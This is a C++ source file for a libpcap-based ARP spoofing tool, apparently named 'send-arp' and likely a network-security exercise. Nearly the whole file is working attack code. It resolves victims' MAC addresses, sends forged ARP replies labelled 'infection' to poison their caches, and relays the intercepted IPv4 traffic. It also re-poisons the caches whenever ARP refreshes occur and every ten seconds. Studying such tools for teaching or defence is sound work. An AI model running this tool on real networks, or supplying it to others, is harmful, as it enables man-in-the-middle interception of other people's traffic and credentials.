#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <pthread.h>
#include<time.h>
#include <ctime>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

uint8_t my_mac[6];
uint32_t my_ip;

void debug(int a)
{
	printf("%dth point\n", a);
}

#pragma pack(push, 1)
struct EthArpPacket final 
{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthIpPacket final 
{
	EthHdr eth_;
	IpHdr ip_;
};
#pragma pack(pop)

void usage() 
{
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int GetMacAddr(const char* interface, uint8_t* my_mac)
{
	struct ifreq ifr;
	int sockfd, ret;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("socket() FAILED\n");
		return -1;
	}

	strncpy(ifr.ifr_name, interface, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("ioctl() FAILED\n");
		close(sockfd);
		return -1;
	}
	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6); // mac addr len = 6
	close(sockfd);

	return 0;
}

void broadcast (pcap_t* handle, Ip sender_ip, Mac* sender_mac)
{   
    EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(my_mac); // my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // request
	packet.arp_.smac_ = Mac(my_mac); // my mac
	packet.arp_.sip_ = htonl(Ip("0.0.0.0")); // my ip ?
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(sender_ip); // sender ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}	

	/* get sender packet */
	struct pcap_pkthdr* header;
	const u_char* rcvpacket;
	PEthHdr ethernet_hdr;
	PArpHdr arp_hdr;
	while(true){ 
		int res = pcap_next_ex(handle, &header, &rcvpacket);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		/* Get eth header */
		ethernet_hdr = (PEthHdr)rcvpacket;
		uint16_t eth_type = ethernet_hdr->type();
		if(eth_type == EthHdr::Arp){ // check if arp 
			/* Get ARP header */
			arp_hdr = (PArpHdr)(rcvpacket + sizeof(struct EthHdr));
			if(arp_hdr->sip()==sender_ip) break; // check sender ip
		}
	}
	*sender_mac = arp_hdr->smac();
}

void reply(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac sender_mac)
{
	EthArpPacket packet;

	/* Send ARP infection packet */
	packet.eth_.dmac_ = sender_mac; // sender mac
	packet.eth_.smac_ = Mac(my_mac); // my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply); // reply
	packet.arp_.smac_ = Mac(my_mac);  // my mac
	packet.arp_.sip_ = htonl(receiver_ip); // receiver ip
	packet.arp_.tmac_ = sender_mac; // sender mac
	packet.arp_.tip_ = htonl(sender_ip); // sender ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void infection(pcap_t* handle, Ip sender_ip, Ip receiver_ip, Mac* sender_mac)
{
    broadcast(handle, sender_ip, sender_mac);
	reply(handle, sender_ip, receiver_ip, *sender_mac);
}

void relay (pcap_t* handle, PEthHdr ethernet_hdr, PIpHdr ip_hdr, Mac receiver_mac) 
{
    int size = sizeof(EthHdr) + ntohs(ip_hdr->total_len); // get header size
	ethernet_hdr->smac_ = Mac(my_mac); // modify src mac -> my mac 
	ethernet_hdr->dmac_ = receiver_mac; // modify dmac -> original destination

	// relay packet
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(ethernet_hdr), size);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}		
}


int main (int argc, char* argv[])
{
    /* check argc */
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return -1;
	}
	char* dev = argv[1]; // interface name
    printf("%s\n", dev);
	GetMacAddr(dev, my_mac); // get my mac

    /* resources */
    unsigned int count = argc / 2 - 1;
    Ip sender_ip[count];
    Ip receiver_ip[count];
    Mac sender_mac[count]; 
    Mac receiver_mac[count];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    /* initialize */
    for (int i = 0; i < count; i++){
        sender_ip[i] = Ip((const char*)argv[2 * (i + 1)]);
        receiver_ip[i] = Ip((const char*)argv[2 * (i + 1) + 1]);
        broadcast(handle, receiver_ip[i], &receiver_mac[i]); // get receiver`s mac
    }

    unsigned int res = 0;
    struct pcap_pkthdr* header;
	const u_char* packet;
    PEthHdr ethernet_hdr;
    PIpHdr ip_hdr;
	PArpHdr arp_hdr;

    /* sender  infection */
    for (int i = 0; i < count; i++){
        infection(handle, sender_ip[i], receiver_ip[i], &sender_mac[i]);
    }
    /* relay packet */
    time_t start_sec = time(NULL);
    uint64_t check = 0;
    while (true) {
        res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		ethernet_hdr = (PEthHdr)packet; // Get eth header 
		uint16_t eth_type = ethernet_hdr->type();
        if (eth_type == EthHdr::Ip4){ // ipv4
			ip_hdr = (PIpHdr)(packet + sizeof(struct EthHdr)); // Get Ip header 
            for (int i = 0; i < count; i++) {
                if (ip_hdr->sip() == sender_ip[i] && ip_hdr->dip() != Ip(my_ip)) {
                    relay(handle, ethernet_hdr, ip_hdr, receiver_mac[i]); // relay packet
                    break;
                }
				else if (ip_hdr->dip() == sender_ip[i] && ip_hdr->sip() != receiver_ip[i]) { 
					relay(handle, ethernet_hdr, ip_hdr, sender_mac[i]); // relay packet
                    break;
				}
            }
        }
        else if (eth_type == EthHdr::Arp) { // arp
            arp_hdr = (PArpHdr)(packet + sizeof(struct EthHdr)); // Get ARP header
            for (int i = 0; i < count; i++) {
                if ((arp_hdr->sip() == sender_ip[i] && arp_hdr->tip() == receiver_ip[i]) || \
                    (arp_hdr->sip() == receiver_ip[i])){
                    reply(handle, sender_ip[i], receiver_ip[i], sender_mac[i]); //reinfection
                }
            }
        }

        /* periodic re-infection */
        time_t current_sec = time(NULL);
        check = current_sec - start_sec;
        if (check >= 10){
            for (int i = 0; i < count ; i++) {
                reply(handle, sender_ip[i], receiver_ip[i], sender_mac[i]); //reinfection
            }
            start_sec = current_sec;
        }
    }

    /* return handle */
    pcap_close(handle);
}